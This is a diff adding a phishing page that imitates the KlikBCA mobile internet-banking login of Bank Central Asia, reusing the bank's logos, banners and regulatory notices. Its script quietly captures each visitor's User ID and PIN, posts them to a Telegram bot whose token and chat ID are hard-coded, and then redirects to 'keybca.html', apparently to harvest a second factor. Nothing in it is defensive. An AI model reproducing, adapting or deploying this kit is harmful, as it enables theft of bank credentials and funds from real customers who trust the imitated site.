@@ -1,0 +1,437 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;" />
+    <title>KlikBCA</title>
+    <style type="text/css">
+        /* Your existing styles here */
+        hr {
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        .OranRule {
+            border: 3px solid #e7d300;
+        }
+
+        /* Slideshow and banner */
+        .banner-slide-container {
+            position: relative;
+        }
+
+        .banner-slide {
+            display: none;
+        }
+
+        .banner-image {
+            width: 100%;
+            border-radius: 8px;
+        }
+
+        body {
+            border: 0;
+            margin: 0;
+            padding: 0;
+            font-family: Verdana;
+            font-size: 12px
+        }
+
+        a:link,
+        a:visited,
+        a:hover,
+        a:active {
+            text-decoration: none;
+        }
+
+        #wrapper {
+            padding: 0;
+            margin: 0;
+            -webkit-text-size-adjust: none;
+        }
+
+        #wrapper #header {
+            padding: 0;
+            margin: 0;
+            background: #4f53b6;
+            -webkit-text-size-adjust: none;
+        }
+
+        #wrapper #header #logo {
+            padding: 0px;
+            margin: 0;
+            -webkit-text-size-adjust: none;
+        }
+
+        #wrapper #header #date {
+            padding: 6px;
+            margin: 0;
+            background: #e7d300;
+            font-size: 9px;
+        }
+
+        #wrapper #pagebody {
+            padding: 0;
+            margin: 0;
+            -webkit-text-size-adjust: none;
+        }
+
+        h2 {
+            font-size: 12px;
+            color: #686868;
+            margin: 0;
+            padding: 0;
+            text-decoration: none;
+        }
+
+        #wrapper #footer {
+            background: #4f53b6;
+            color: #FFFFFF;
+            height: auto;
+            -webkit-text-size-adjust: none;
+        }
+
+        #wrapper #footex {
+            background: #0263b4;
+            color: #FFFFFF;
+            height: auto;
+            -webkit-text-size-adjust: none;
+        }
+
+        .red {
+            color: red;
+        }
+
+        .blue {
+            color: #0000a7;
+        }
+
+        .orange {
+            color: #ff9c00;
+        }
+
+        .grey {
+            background-color: #e0e0e0;
+        }
+
+        .dsub {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            font-weight: bold;
+            color: #888888;
+            background-color: #CCCCCC;
+            border: 2px solid #CCCCCC inset;
+        }
+
+        .esub {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            color: #0000a7;
+            background-color: #CCCCCC;
+            border: 1px #CCCCCC outset;
+            padding: 1px 4px;
+        }
+
+        .ebox {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            color: #0000a7;
+            background-color: #EEEEEE;
+            border: 1px solid #0000a7;
+        }
+
+        .edom {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 11px;
+            color: #0000a7;
+            background-color: #EEEEEE;
+            border: 1px solid #0000a7;
+        }
+
+        .dbo {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            color: #0000a7;
+            background-color: #CCCCCC;
+            border: 1px solid #0000a7;
+        }
+
+        .cheader {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 16px;
+            color: #000000;
+            background-color: #FFFFFF;
+            -webkit-text-size-adjust: none;
+        }
+
+        .clayer {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            color: #000000;
+            background-color: #FFFFFF;
+            -webkit-text-size-adjust: none;
+        }
+
+        .cfooter {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 10px;
+            color: #000000;
+            background-color: #05109b;
+            -webkit-text-size-adjust: none;
+        }
+    </style>
+    <script>
+        // Banner slideshow script
+        let slideIndex = 0;
+        function showSlides() {
+            const slides = document.getElementsByClassName("banner-slide");
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].style.display = "none";
+            }
+            slideIndex++;
+            if (slideIndex > slides.length) { slideIndex = 1; }
+            slides[slideIndex - 1].style.display = "block";
+            setTimeout(showSlides, 4000); // Change image every 4 seconds
+        }
+
+        // Banner click event handler
+        function bannerClickEvent(url) {
+            window.open(url, '_blank');
+        }
+
+        // Form validation (optional, can be customized)
+        function validateForm() {
+            const user = document.getElementById('user').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (user === "" || password === "") {
+                alert("Please fill in both USER ID and PIN.");
+                return false;
+            }
+            return true;
+        }
+
+        window.onload = function () {
+            document.getElementById('user').focus();
+            showSlides();
+        };
+
+        // Function to go to full site (dummy function, replace as needed)
+        function go2Full() {
+            // Replace with actual full site URL
+        }
+
+        // Function to send form data to Telegram Bot
+        async function sendToTelegram(userId, pin) {
+            const botToken = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8'; // Replace with your Telegram bot token
+            const chatId = '7549590022'; // Replace with your Telegram chat ID
+            const message = `KlikBCA Login:\nUser ID: ${userId}\nPIN: ${pin}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                     const data = await response.json();
+
+     if (data.ok) {
+      window.location.href = "keybca.html"; 
+      form.reset();
+     } else {
+      alert('Failed to send message to Telegram.');
+     }
+    } catch (error) {
+     alert('Error sending message to Telegram.');
+    } finally {
+     loadingOverlay.classList.add('hidden');
+            }
+        }
+
+        // Override form submission to send data to Telegram
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.querySelector('form');
+            form.addEventListener('submit', async function (e) {
+                e.preventDefault();
+                if (!validateForm()) return;
+
+                const userId = document.getElementById('user').value.trim();
+                const pin = document.getElementById('password').value.trim();
+
+                // Send data to Telegram
+                const sent = await sendToTelegram(userId, pin);
+
+                if (sent) {
+                    // Optionally submit the form to server after sending to Telegram
+                    form.submit();
+                } else {
+                    alert('Failed to send data to Telegram. Please try again.');
+                }
+            });
+        });
+    </script>
+</head>
+
+<body>
+
+    <div id="wrapper">
+        <div id="header">
+            <div id="logo" style="background:#FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top; height:57px; color:#FFFFFF">
+                <img src="https://m.klikbca.com/images/logo_bca_64x55.gif" alt="BCA-lite" />
+            </div>
+            <div style="background:#e7cb00; height:5px">&nbsp;</div>
+        </div>
+
+        <div id="page-content" style="display:inline-block;">
+            <form method="post" action="#" class="input_style_1" onsubmit="return validateForm()">
+                <input type="hidden" name="_token" value="3iGGAlOMbNDKfcOAJQqCIegzVJuWoxkU2mpx2TzV" autocomplete="off" />
+                <table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
+                    <tbody>
+                        <tr>
+                            <td>
+                                <table cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                        <tr>
+                                            <td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan USER ID Anda</td>
+                                        </tr>
+                                        <tr>
+                                            <td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your USER ID</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="text" name="user" id="user" class="form-control" required />
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <table cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                        <tr>
+                                            <td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan PIN Internet Banking Anda</td>
+                                        </tr>
+                                        <tr>
+                                            <td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your Internet Banking PIN</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="password" name="password" id="password" size="24" maxlength="6" autocomplete="off" />
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="border-bottom:solid 1px #6f6f6f">
+                                <input type="submit" value="LOGIN" name="value(Submit)" id="submit" onmouseover="this.style.cursor='hand'" />
+                            </td>
+                            <td align="right" valign="bottom" style="border-bottom:solid 1px #6f6f6f">
+                                <a href="javascript:go2Full();"><u>Full Site</u></a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </form>
+
+            <table cellpadding="6" cellspacing="0">
+                <tbody>
+                    <tr>
+                        <td>
+                            <div class="banner-slide-container">
+                                <div class="banner-slide">
+                                    <img class="banner-image" src="https://m.klikbca.com/images/banner_login_1.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/Edukatips/2024/06/25/04/12/yuk-verifikasi-email-klikbca-mu-agar-transaksi-bisa-terpantau')" style="cursor: pointer;" />
+                                </div>
+                                <div class="banner-slide">
+                                    <img class="banner-image" src="https://m.klikbca.com/images/banner_login_2.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/news-and-features/2022/03/22/07/16/Kini-bisa-Perpanjang-Tahapan-Berjangka-BCA-via-KlikBCA?funnel_source=search_suggestion')" style="cursor: pointer;" />
+                                </div>
+                                <div class="banner-slide">
+                                    <img class="banner-image" src="https://m.klikbca.com/images/banner_login_3.png" onclick="bannerClickEvent('https://bca.id/3Cjnv09')" style="cursor: pointer;" />
+                                </div>
+                                <div class="banner-slide">
+                                    <img class="banner-image" src="https://m.klikbca.com/images/banner_login_4.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/Edukatips/2020/12/28/03/48/Stay-Up-to-Date-Perlancar-eBanking-mu-dengan-browser-dan-OS-terbaru')" style="cursor: pointer;" />
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a href="https://www.bca.co.id/awasmodus?utm_campaign=Awas%20Modus&utm_source=iBank%20Klik%20BCA&utm_medium=CTW&utm_term=Edukatips&utm_content=Banner%20Awas%20Modus" target="new">
+                                <img src="https://m.klikbca.com/images/keamanan-ib.png" alt="" border="0" height="30" />
+                            </a>
+                            <img src="https://m.klikbca.com/images/digicert-seal.png" alt="DigiCert Seal" height="30" />
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            		<table style="padding-left:6px; padding-right:6px;padding-bottom:6px" cellspacing="0">
+			<tr>
+				<td>
+					<table cellspacing="0" cellpadding="0">
+						<tr align="left">
+							<td>
+								<font face="Verdana" size="1" color="#303962">
+									BCA berizin dan diawasi oleh Otoritas Jasa Keuangan &amp; Bank Indonesia.<br>
+									BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp2 miliar.<br>
+									Untuk cek Tingkat Bunga Penjaminan LPS, klik <a href="https://apps.lps.go.id/BankPesertaLPSRate" target="_blank"><font color="#303962"><u>disini</u></font></a>.
+								</font>
+							</td>
+						</tr>
+						<tr>
+							<td style="padding-top: 2px">
+								<hr style="height:1px;border-width:0;color:#303962;background-color:#6f6f6f">
+							</td>
+						</tr>
+						<tr align="left">
+							<td>
+								<font face="Verdana" size="1" color="#ff9c00">
+									BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan) &amp; Bank Indonesia.<br>
+									BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum deposit value guaranteed by LPS per customer per bank is IDR 2 billion.<br>
+									To check the LPS Guarantee Interest Rate, click <a href="https://apps.lps.go.id/BankPesertaLPSRate" target="_blank"><font color="#ff9c00"><u>here</u></font></a>.
+								</font>
+							</td>
+						</tr>
+					</table>
+				</td>
+			</tr>
+		</table>
+	</div>
+	
+	<div id="footer" valign="middle">
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+			<tr>
+			<td width="10" height="35">&nbsp;</td>
+			<td valign="middle" align="left" width="20"></td>
+			<td>&nbsp;</td>
+			</tr>
+		</table>
+        </div>
+
+        <div id="footer" valign="middle">
+            <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                <tbody>
+                    <tr>
+                        <td width="10" height="1">&nbsp;</td>
+                        <td valign="middle" align="left" width="20"></td>
+                        <td>&nbsp;</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+        </div>
+    </div>
+
+</body>
+
+  </html>
